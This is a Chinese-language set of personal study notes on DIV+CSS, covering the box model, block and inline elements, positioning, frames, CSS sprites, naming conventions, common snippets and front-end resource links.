class和id的主要差别是：class用于元素组（类似的元素，或者可以理解为某一类元素），而id用于标识单独的唯一的元素。  盒子模型的组成\n 盒子模型组成部分：  自身内容：width、height 宽高 内边距： padding 盒子边框： border 边框线 与其他盒子距离： margin外边距 内容+内边距+边框+外边距=面积   border 边框\n 常见写法 border:1px solid #f00;  单独属性：\n border-width: border-style:  dotted 点状虚线 dashed（虚线） solid（实线） double（双实线）  border-color (颜色)  padding 内边距\n 值：像素/厘米等长度单位、百分比\n padding:10px; 上下左右 padding:10px 10px; 上下 左右 padding:10px 10px 10px; 上 左右 下 padding:10px 10px 10px 10px; 上 右 下 左（设置4个点\u0026ndash;\u0026gt;顺时针方向）   单独属性：\n padding-top: padding-right: padding-bottom: padding-left:  当设置内边距的时候会把盒子撑大，为了保持盒子原来的大小，应该高度和宽度进行减小，根据width和height减小\n margin 外边距\n 值：与padding相同\n 单独属性：与padding相同\n  外边距合并：两个盒子同时设置了外边距，会进行一个外边距合并\n  补充盒子模型内容\n 标准盒子模型\n 盒子模型是css中一个重要的概念，理解了盒子模型才能更好的排版。其实盒子模型有两种，分别是 ie盒子模型和标准 w3c 盒子模型。他们对盒子模型的解释各不相同，先来看看我们熟知的标准盒子模型    从上图可以看到标准 w3c 盒子模型的范围包括 margin、border、padding、content，并且 content部分不包含其他部分\n ** IE盒子模型**\n   从上图可以看到 ie盒子模型的范围也包括 margin、border、padding、content 和标准 w3c 盒子模型不同的是：ie 盒子模型的 content 部分包含了 border和 padding\n IE盒子模型width = padding+border+内容\n 标准盒子模型 = 内容的宽度（不包含border+padding）\n 例：\n 一个盒子的 margin为 20px，border 为 1px，padding为 10px，content 的宽为 200px、高为 50px，假如用标准 w3c 盒子模型解释，那么这个盒子需要占据的位置为：宽 20*2+1*2+10*2+200=262px、高 20*2+1*2*10*2+50=112px，盒子的实际大小为：宽 1*2+10*2+200=222px、高 1*2+10*2+50=72px；假如用ie 盒子模型，那么这个盒子需要占据的位置为：宽 20*2+200=240px、高 20*2+50=70px，盒子的实际大小为：宽 200px、高 50px  那应该选择哪中盒子模型呢？当然是“标准 w3c 盒子模型”了。怎么样才算是选择了“标准 w3c盒子模型”呢？很简单，就是在网页的顶部加上 doctype 声明。\n 假如不加doctype 声明，那么各个浏览器会根据自己的行为去理解网页，即 ie浏览器会采用 ie 盒子模型去解释你的盒子，而 ff会采用标准w3c 盒子模型解释你的盒子，所以网页在不同的浏览器中就显示的不一样了。\n 反之，假如加上了 doctype 声明，那么所有浏览器都会采用标准 w3c盒子模型去解释你的盒子，网页就能在各个浏览器中显示一致了。\n   用 jquery 做的例子来证实一下  \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;你用的盒子模型是？\u0026lt;/title\u0026gt; \u0026lt;script language=\u0026quot;javascript\u0026quot; src=\u0026quot;jquery.min.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script language=\u0026quot;javascript\u0026quot;\u0026gt; var sbox = $.boxmodel ? \u0026quot;标准w3c\u0026quot;:\u0026quot;ie\u0026quot;; document.write(\u0026quot;您的页面目前支持：\u0026quot;+sbox+\u0026quot;盒子模型\u0026quot;); \u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   　上面的代码没有加上 doctype 声明，在 ie 浏览器中显示 ie盒子模型，在 ff 浏览器中显示“标准w3c 盒子模型”。  \u0026lt;!doctype html public \u0026quot;-//w3c//dtd xhtml 1.0 transitional//en\u0026quot; \u0026quot;http://www.w3.org/tr/xhtml1/dtd/xhtml1-transitional.dtd\u0026quot;\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;你用的盒子模型是标准w3c盒子模型\u0026lt;/title\u0026gt; \u0026lt;script language=\u0026quot;javascript\u0026quot; src=\u0026quot;jquery.min.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script language=\u0026quot;javascript\u0026quot;\u0026gt; var sbox = $.boxmodel ? \u0026quot;标准w3c\u0026quot;:\u0026quot;ie\u0026quot;; document.write(\u0026quot;您的页面目前支持：\u0026quot;+sbox+\u0026quot;盒子模型\u0026quot;); \u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   　代码2 与代码1 唯一的不同的就是顶部加了 doctype声明。在所有浏览器中都显示“标准 w3c盒子模型”\n 所以为了让网页能兼容各个浏览器，让我们用标准 w3c 盒子模型\n 扩展\n 学会使用box-sizing布局   第十四章 块元素、行元素与溢出  基本概念  块级元素：默认情况下独占一行的元素，可控制宽高、上下边距； 行内元素：默认情况下一行可以摆放多个的元素，不可控制宽高和上下边距  行块转换\n display:none; 不显示 display:block; 变成块级元素 display:inline; 变成行级元素 display:inline-block; 以块级元素样式展示，以行级元素样式排列  溢出\n overflow:hidden; 溢出隐藏 overflow:scroll; 内容会被修剪，浏览器会显示滚动条 overflow:auto; 如果内容被修剪，则产生滚动条  文本不换行：white-space:nowrap;\n 长单词换行：word-wrap:break-word;\n 行内元素和快级元素小结\n 一、块级元素：block element\n 每个块级元素默认占一行高度，一行内添加一个块级元素后无法一般无法添加其他元素（float浮动后除外）。两个块级元素连续编辑时，会在页面自动换行显示。块级元素一般可嵌套块级元素或行内元素；\n 块级元素一般作为容器出现，用来组织结构，但并不全是如此。有些块级元素，如只能包含块级元素。\n DIV 是最常用的块级元素，元素样式的display:block都是块级元素。它们总是以一个块的形式表现出来，并且跟同级的兄弟块依次竖直排列，左右撑满。\n 二、行内元素：inline element\n 也叫内联元素、内嵌元素等；行内元素一般都是基于语义级(semantic)的基本元素，只能容纳文本或其他内联元素，常见内联元素 “a”。比如 SPAN元素，IFRAME元素和元素样式的display : inline的都是行内元素。例如文字这类元素，各个字母 之间横向排列，到最右端自动折行。\n 三、block（块）元素的特点:\n ①、总是在新行上开始；\n ②、高度，行高以及外边距和内边距都可控制；\n ③、宽度缺省是它的容器的100%，除非设定一个宽度。\n ④、它可以容纳内联元素和其他块元素\n 四、inline元素的特点\n ①、和其他元素都在一行上；\n ②、高，行高及外边距和内边距不可改变；\n ③、宽度就是它的文字或图片的宽度，不可改变\n ④、内联元素只能容纳文本或者其他内联元素\n 对行内元素，需要注意如下:\n 设置宽度width 无效。 设置高度height无效，可以通过line-height来设置。 设置margin\n 只有左右margin有效，上下无效。\n 设置padding只有左右padding有效，上下则无效。注意元素范围是增大了，但是对元素周围的内容是没影响的。\n 五、常见的块状元素\n address – 地址\n blockquote – 块引用\n center – 举中对齐块\n dir – 目录列表\n div – 常用块级容易，也是CSS layout的主要标签\n dl – 定义列表\n fieldset – form控制组\n form – 交互表单\n h1 – 大标题\n h2 – 副标题\n h3 – 3级标题\n h4 – 4级标题\n h5 – 5级标题\n h6 – 6级标题\n hr – 水平分隔线\n isindex – input prompt\n menu – 菜单列表\n noframes – frames可选内容，（对于不支持frame的浏览器显示此区块内容\n noscript – 可选脚本内容（对于不支持script的浏览器显示此内容）\n ol – 有序表单\n p – 段落\n pre – 格式化文本\n table – 表格\n ul – 无序列表\n 六、常见的内联元素\n a – 锚点\n abbr – 缩写\n acronym – 首字\n b – 粗体(不推荐)\n bdo – bidi override\n big – 大字体\n br – 换行\n cite – 引用\n code – 计算机代码(在引用源码的时候需要)\n dfn – 定义字段\n em – 强调\n font – 字体设定(不推荐)\n i – 斜体\n img – 图片\n input – 输入框\n kbd – 定义键盘文本\n label – 表格标签\n q – 短引用\n s – 中划线(不推荐)\n samp – 定义范例计算机代码\n select – 项目选择\n small – 小字体文本\n span – 常用内联容器，定义文本内区块\n strike – 中划线\n strong – 粗体强调\n sub – 下标\n sup – 上标\n textarea – 多行文本输入框\n tt – 电传文本\n u – 下划线\n 七，可变元素\n 可变元素为根据上下文语境决定该元素为块元素或者内联元素。\n applet - java applet\n button - 按钮\n del- 删除文本\n iframe - inline frame\n ins - 插入的文本\n map - 图片区块(map)\n object - object对象\n script - 客户端脚本\n 八、行内元素与块级元素有什么不同\n 区别一：\n 块级：块级元素会独占一行，默认情况下宽度自动填满其父元素宽度 行内：行内元素不会独占一行，相邻的行内元素会排在同一行。其宽度随内容的变化而变化。  区别二：\n 块级：块级元素可以设置宽高 行内：行内元素不可以设置宽高  区别三：\n 块级：块级元素可以设置margin，padding 行内：行内元素水平方向的margin-left; margin-right;  padding-left; padding-right;可以生效。但是竖直方向的margin-bottom; margin-top; padding-top; padding-bottom;却不能生效。\n 区别四：\n 块级：display:block; 行内：display:inline;  替换元素有如下：（和img一样的设置方法）\n \u0026lt;img\u0026gt;、\u0026lt;input\u0026gt;、\u0026lt;textarea\u0026gt;、\u0026lt;select\u0026gt;\n \u0026lt;object\u0026gt;都是替换元素，这些元素都没有实际的内容\n  可以通过修改display属性来切换块级元素和行内元素\n  第十五章 定位  static静态定位（不对它的位置进行改变，在哪里就在那里）\n 默认值。没有定位，元素出现在正常的流中（忽略 top,bottom, left, right 或者 z-index 声明）。  fixed固定定位（参照物\u0026ndash;浏览器窗口）\u0026mdash;做 弹窗广告用到\n 生成固定定位的元素，相对于浏览器窗口进行定位。 元素的位置通过 \u0026quot;left\u0026quot;, \u0026quot;top\u0026quot;, \u0026quot;right\u0026quot;以及 \u0026quot;bottom\u0026quot;属性进行规定。  relative（相对定位 ）（参照物以他本身）\n 生成相对定位的元素，相对于其正常位置进行定位。  absolute（绝对定位）(除了static都可以，找到参照物\u0026ndash;\u0026gt;与它最近的已经有定位的父元素进行定位)\n 生成绝对定位的元素，相对于 static 定位以外的第一个父元素进行定位。 元素的位置通过 \u0026ldquo;left\u0026quot;, \u0026quot;top\u0026quot;, \u0026quot;right\u0026quot; 以及 \u0026quot;bottom\u0026quot; 属性进行规定  z-index\n z-index 属性设置元素的堆叠顺序。拥有更高堆叠顺序的元素总是会处于堆叠顺序较低的元素的前面。 定位的基本思想: 它允许你定义元素框相对于其正常位置应该出现的位置，或者相对于父元素、另一个元素甚至浏览器窗口本身的位置。  一切皆为框\n 块级元素: div、h1或p元素 即：显示为一块内容称之为 “块框“ ; 行内元素: span,strong,a等元素 即：内容显示在行中称 \u0026ldquo;行内框\u0026rdquo;; 使用display属性改变成框的类型 即：display:block; 让行内元素设置为块级元素，display:none; 没有框  相对定位：\n 如果对一个元素进行相对定位，它将出现在它所在的位置上。 通过设置垂直或水平位置，让这个元素“相对于”它的起点进行移动 .adv_relative { position: relative; left: 30px; top: 20px; }  绝对定位：\n 元素的位置相对于最近的已定位祖先元素，如果元素没有已定位 的祖先元素，它的位置相对于最初的包含块。 .adv_absolute { position: absolute; left: 30px; top: 20px; }   第十六章 框架  frameset框架：  \u0026lt;frameset\u0026gt; \u0026mdash;- 用来定义一个框架；双标签 不能和 \u0026lt;body\u0026gt; 一起使用  rows、cols属性\n rows 定义行表示框架有多少行（取值 px/ %/ * ） cols 定义列表示框架有多少列（取值px/ %/ * ）  frame子框架\n \u0026lt;frame\u0026gt; \u0026mdash;- 表示框架中的某一个部分；单标签，要跟结束标志 src 显示的网页的路径 name 框架名 frameborder 边框线（取值 0 / 1）\n \u0026lt;noframes\u0026gt;属性\n \u0026lt;noframes\u0026gt; 提供不支持框架的浏览器显示body的内容；双标签\n   \u0026lt;frameset\u0026gt; \u0026lt;frame src=“” /\u0026gt; \u0026lt;frame src=“” /\u0026gt; \u0026lt;frame src=“” /\u0026gt; \u0026lt;noframes\u0026gt; \u0026lt;body\u0026gt;内容\u0026lt;/body\u0026gt; \u0026lt;/noframes\u0026gt; \u0026lt;/frameset\u0026gt;   \u0026lt;iframe\u0026gt;内联框架  iframe元素会创建包含另外一个文档的内联框架（即行内框架） 允许和 body 一起使用 width 宽（取值 px / %） height 高（取值 px / %） name 框架名 frameborder 边框线（取值 0 / 1） src 显示的网页的路径   第十七章 css高级属性  opacity透明属性  opacity 对于IE6/7/，使用filter:alpha(opacity:值;) 值为0-100 对于Webkit，Opera，Firefox，IE9+，使用opacity:值; 值为0-1 对于早期火狐，使用-moz-opacity:值; 值为0-1 所以写透明属性时，一般写法是    {\topacity:0.5; filter:alpha(opacity：50);/*0-100*/ -moz-opacity:0.5;\t/*取值0-1*/--\u0026gt;针对早起版本的火狐兼容问题的解决 }   border-radius圆角边框属性\n 向 div 元素添加圆角边框  border-radius:10px;   box-shadow阴影属性\n box-shadow属性向框添加阴影效果,后面跟4个参数。\n box-shadow:0px 0px 10px #000;\n  \u0026lt;embed\u0026gt;属性\n 是HTML5中新增的标签,媒体嵌入插件标签，可以通过\u0026lt;embed\u0026gt;插入音频或视频\n \u0026lt;embed src=“media/music.mp3” /\u0026gt;\n 格式.mid .wav .mp3等\n    CSS部分导图总结   原文件下载地址 访问密码 342a   css常见简写  第三部分 附录 附录一 DIV命名规范  企业DIV使用频率高的命名方法\n 网页内容类\n 标题: title 摘要: summary 箭头： arrow 商标： label 网站标志： logo 转角/圆角：corner 横幅广告： banner 子菜单： subMenu 搜索： search 搜索框： searchBox 登录： login 登录条：loginbar 工具条： toolbar 下拉： drop 标签页： tab 当前的： current 列表： list 滚动： scroll 服务： service 提示信息： msg 热点：hot 新闻： news 小技巧： tips 下载： download 栏目标题： title 热点： hot 加入：joinus 注册： regsiter 指南： guide 友情链接： friendlink 状态： status 版权： copyright 按钮： btn 合作伙伴： partner 投票： vote 左右中：left right center    注释的写法: /* Footer */ 内容区/* End Footer */   id的命名:\n 页面结构\n 容器: container 页头：header 内容：content/container 页面主体：main 页尾：footer 导航：nav 侧栏：sidebar 栏目：column 页面外围控制整体布局宽度：wrapper 左右中：left right center     导航\n 导航：nav 主导航：mainbav 子导航：subnav 顶导航：topnav 边导航：sidebar 左导航：leftsidebar 右导航：rightsidebar 菜单：menu 子菜单：submenu 标题: title 摘要: summary     功能\n 标志：logo 广告：banner 登陆：login 登录条：loginbar 注册：regsiter 搜索：search 功能区：shop 标题：title 加入：joinus 状态：status 按钮：btn 滚动：scroll 标签页：tab 文章列表：list 提示信息：msg 当前的:current 小技巧：tips 图标: icon 注释：note 指南：guild 服务：service 热点：hot 新闻：news 下载：download 投票：vote 合作伙伴：partner 友情链接：link 版权：copyright     class的命名:\n 颜色:使用颜色的名称或者16进制代码,如\n .red { color: red; } .f60 { color: #f60; } .ff8600 { color: #ff8600; }   字体大小,直接使用\u0026rdquo;font+字体大小\u0026rdquo;作为名称,如\n .font12px { font-size: 12px; } .font9px {font-size: 9pt; }   对齐样式,使用对齐目标的英文名称,如\n .left { float:left; } .bottom { float:bottom; }   标题栏样式,使用\u0026rdquo;类别+功能\u0026rdquo;的方式命名,如\n .barnews { } .barproduct { }     注意事项::\n 一律小写; 尽量用英文; 不加中杠和下划线; 尽量不缩写，除非一看就明白的单词.     推荐的 CSS 书写顺序：\n 显示属性\n display list-style position float clear   自身属性\n width height margin padding border background   文本属性\n color font text-decoration text-align vertical-align white-space other text content\n    附录二 CSS精灵  CSS精灵原理以及应用  CSS雪碧的基本原理是把你的网站上用到的一些图片整合到一张单独的图片中，从而减少你的网站的HTTP请求数量。 该图片使用CSS background和background-position属性渲染，这也就意味着你的标签变得更加复杂了，图片是在CSS中定义，而非\u0026lt;img\u0026gt;标签。  一个简单的例子：  一张图片作出一个按钮的三个状态 一个链接用CSS做成按钮的样式，我们可以使用同一张图片，完成按钮的三个状态，a:link，a:hover，a:active \u0026lt;a class=\u0026quot;button\u0026quot; href=\u0026quot;#\u0026quot;\u0026gt;链接\u0026lt;/a\u0026gt; 加入右侧的图片为：200px 65px的三个按钮图拼合而成的图片button.png，从上到下一次为按钮的普通、鼠标滑过、鼠标点击的状态。则可以使用CSS进行定义。     a { display:block; width:200px; height:65px; line-height:65px; /*定义状态*/ text-indent:-2015px; /*隐藏文字*/ background-image:url(button.png); /*定义背景图片*/ background-position:0 0; /*定义链接的普通状态，此时图像显示的是顶上的部分*/ } a:hover { background-position:0 -66px; /*定义链接的滑过状态，此时显示的为中间部分，向下取负值*/ } a:active { background-position:0 -132px; /*定 义链接的普通状态，此时显示的是底部的部分，向下取负值*/ }   更多的CSS雪碧，图片更复杂，背景定位更精确。可能会用到大量的数值  如：background:url(nav.png) -180px 24pxno-repeat; 来达到更精确的定位  优点：  减少加载网页图片时对服务器的请求次数 可以合并多数背景图片和小图标，方便在任何位置使用，这样不同位置的请求只需要调用一个图片，从而减少对服务器的请求次数，降低服务器压力，同时提高了页面的加载速度，节约服务器的流量。 提高页面的加载速度 sprite技术的其中一个好处是图片的加载时间(在有许多 sprite 时，单张图片的加载时间)。由所需图片拼成的一张 GIF图片的尺寸会明显小于所有图片拼合前的大小。单张的 GIF只有相关的一个色表，而单独分割的每一张 GIF 都有自己的一个色表，这就增加了总体的大小。因此，单独的一张 JPEG 或者 PNG sprite 在大小上非常可能比把一张图分成多张得来的图片总尺寸小。 减少鼠标滑过的一些bug IE6不会主动预加载鼠标滑过即a:hover中的背景图片，所以，如果使用多张图片，鼠标滑过会出现闪白的现象。使用CSS雪碧，由于一张图片即可，所以不会出现这种现象。  不足：  CSS雪碧的最大问题是内存使用 影响浏览器的缩放功能 拼图维护比较麻烦 使CSS的编写变得困难 CSS 雪碧调用的图片不能被打印 错误得使用 Sprites 影响可访问性   附录三 一些tips解决方案 页面优化实践  从下面的几个方面可以进行页面的优化：\n 减少请求数 图片合并 CSS文件合并 减少内联样式 避免在 CSS中使用 import 减少文件大小 选择适合的图片格式 图片压缩 CSS 值缩写（Shorthand Property) 文件压缩 页面性能 调整文件加载顺序 减少标签数量 调整选择器长度 尽量使用 CSS 制作显示表现 增强代码可读性与可维护性 规范化 语义化 模块化   写DIV+CSS 的一些常识  不要使用过小的图片做背景平铺\n 这就是为何很多人都不用 1px 的原因，这才知晓。宽高 1px 的图片平铺出一个宽高 200px 的区域，需要 200200=40, 000 次，占用资源  无边框\n 推荐的写法是 border:none;，哈哈，我一直在用这个。 border:0; 只是定义边框宽度为零，但边框样式、颜色还是会被浏览器解析，占用资源  慎用 通配符\n 所谓通配符，就是将 CSS 中的所有标签均初始化，不管用的不用的，过时的先进的，一视同仁，这样，大大的占用资源。要有选择的初始化标签。  CSS的十六进制颜色代码缩写\n 习惯了缩写及小写，这才知道，原来不是推荐的写法，为的是减少解析所占用的资源。但同时会增加文件体积。孰优孰劣，有待仔细考证。  样式放头上，脚本放脚下。不内嵌，只外链\n 坚决不用 CSS表达式\n 使用 引用样式表，而不是通过 @import 导入。\n 一般来说，PNG比 GIF 要小，小得多。再者，GIF 中有多少颜色是被浪费的，很值得优化。\n 千万不要在 HTML中缩放图片，一者不好看，二者占资源。\n 正文字体最好用偶数\n 12px、14px、16px，效果非常好。特例，15px。  block、ul、ol等上下留出至少一倍行距，左侧至少两倍行距，右侧随意。\n 段落之间，至少要有一倍行距\n 强行指定某些元素的 line-height，正文 1.6倍于文字大小，标题1.3倍。\n 中文标点用全角\n 英文夹杂在中文中，左右空格，半角。  中文字体的粗体和斜体，远离较好\n  常用代码片段  雅虎工程师提供的CSS初始化示例代码【仅供参考】  可以在html头文件中直接引用，从而避免浏览器的不兼容带来的错误。   body, div, dl, dt, dd, ul, ol, li, h1, h2, h3, h4, h5, h6, pre, code, form, fieldset, legend, input, button, textarea, p, blockquote, th, td { margin:0; padding:0; } body { background:#fff; color:#555; font-size:14px; font-family: Verdana, Arial, Helvetica, sans-serif; } td, th, caption { font-size:14px; } h1, h2, h3, h4, h5, h6 { font-weight:normal; font-size:100%; } address, caption, cite, code, dfn, em, strong, th, var { font-style:normal; font-weight:normal; } a { color:#555; text-decoration:none; } a:hover { text-decoration:underline; } img { border:none; } ol,ul,li { list-style:none; } input, textarea, select, button { font:14px Verdana,Helvetica,Arial,sans-serif; } table { border-collapse:collapse; } html { overflow-y: scroll; } .clearfix:after { content: \u0026quot;.\u0026quot;; display: block; height:0; clear:both; visibility: hidden; } .clearfix { *zoom:1; }   mobile meta标签  \u0026lt;meta name=”viewport” content=”width=320,target-densitydpi=dpi_value,initial-scale=1, user-scalable=no”/\u0026gt;   表格不被撑开  table-layout: fixed; word-break: break-all;;border-collapse: collapse   不设宽高居中  \u0026lt;div id=”abc” style=”display:table;text-align:center;width:100%;height:100%;”\u0026gt; \u0026lt;span style=”background:#f00; display:table-cell; vertical-align:middle;”\u0026gt; \u0026lt;input type=”button” value=”item1″ /\u0026gt; \u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt;   透明度的兼容代码  filter:alpha(opacity=50); /*1-100*/ -moz-opacity:0.5; /*0-1.0*/ -khtml-opacity:0.5; /*0-1.0*/ opacity:0.5; /*0-1.0*/   文字溢出点点省略  white-space:nowrap; text-overflow:ellipsis; overflow:hidden;   清除浮动的几种方法\n 方法一：投机取巧法 \u0026ndash; 不推荐 直接一个放到当作最后一个子标签放到父标签那儿，此方法屡试不爽，兼容性强\n 方法二：overflow + zoom方法 \u0026ndash;不推荐 .fix{overflow:hidden; zoom:1;}\n 此方法优点在于代码简洁，涵盖所有浏览器\n 方法三：after + zoom方法 -推荐\u0026ndash;此方法可以说是综合起来最好的方法了\n clearfix只应用在包含浮动子元素的父级元素上\n   .fix{zoom:1;} .fix:after{ display:block; content:'clear'; clear:both; line-height:0; visibility:hidden; }   更多代码片段详情  实用的60个CSS代码片段   一些总结  自动继承属性：\n color font text-align list-style \u0026hellip;  非继承属性：\n background border position \u0026hellip;  具有破坏性的元素：\n float display:none; position:absoblute/fixed/sticky;  具有包裹性的元素：\n display:inline-block/table-cell\n position:absolute/fixed/sticky\n overflow:hidden/scroll\n  消除图片底部间隙的方法\n 图片块状化-无基线对齐 img{display:block;}\n 图片底线对齐 img{vertical-align:bottom;}\n 行高足够小 - 基线位置上移 .box{line-height:0;}\n   一些概念  BFC\n BFC全称”Block Formatting Context” 中文为“块级格式化上下文”\n 记住这么一句话：BFC元素特性表现原则就是，内部子元素再怎么翻江倒海，翻云覆雨都不会影响外部的元素\n BFC就是页面上的一个隔离的独立容器，容器里面的子元素不会影响到外面的元素。反之也如此\n 扩展阅读\n CSS中的BFC\n  优雅降级(graceful degradation)\n 一开始就构建完整的功能，然后再针对低版本浏览器进行兼容  渐进增强 progressive enhancement：\n 是在浏览器开启JavaScript功能后，如果浏览器版本不支持某些 JavaScript 能力，我们解决这种问题的方式  平稳退化\n 是在浏览器没有JavaScript功能，或没有开启JavaScript功能情况下，我们解决这种问题的方式；   方案荟萃扩展阅读  关于布局\n 垂直居中 css完全居中 居中之美 网页中的底部foot定位 页面高度100% textarea高度自适应 多行溢出省略 Retina屏1px线 Flexbugs  其他\n IF IE ENDIF条件判断之IE10 Chrome 翻译插件 网页retina优化 常用meta 树状菜单 em vs rem css vs js css解决方案（w3cplus） Textures生成纹理 CSSgram Csscss（检查重复声明等）   附录四 部分工具资源  学会使用Emmet插件快速编码 Emmet常用快捷键 Sublime专题 Sublime常用插件总结 Front-End -Develop -Tools ToolsBox-自己整理的一份工具列表  附录五 编码规范  编码规范 前端规范 web develop standard Web 前端开发规范文档 前端开发规范手册  附录六 进阶学习  DOM编程之API学习 JavaScript基础学习  附录七 其他资源  Github上前端学习资源汇总 WEB 前端开发学习笔记 前端开发工具箱 148个资源让你成为CSS专家 学习CSS布局-经典必看  附录八 常见问题  前端指路\n 写给前端面试者（w3cplus） 如何成为一名卓越的前端工程师（勾三股四博客） 什么是全栈工程师 如何跟上前端开发的最新前沿 浏览器的工作原理 移动前端开发和 Web 前端开发的区别 大型网站CSS编写与维护 CSS核心技术关键字  性能/规范/实践\n 如何阅读W3c规范(王晓轩) 如何阅读W3c规范(高博) 雅虎web性能优化军规 权威前端性能指南 高性能css  一些问答社区\n quora stackoverflow 知乎 前端乱炖问答区 segmentfault问答区   其他  本文Mardown原文件-欢迎转载 ","permalink":"http://localhost:8000/public/post/div+css%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E5%9B%9E%E9%A1%BE/","tags":["CSS","XHTML"],"title":"DIV+CSS系统学习笔记回顾"},{"categories":null,"contents":"Results from static site search implemented using Fusejs, jquery and mark.js. \u0026ndash; Source\n","permalink":"http://localhost:8000/public/search/","tags":null,"title":"Search"}]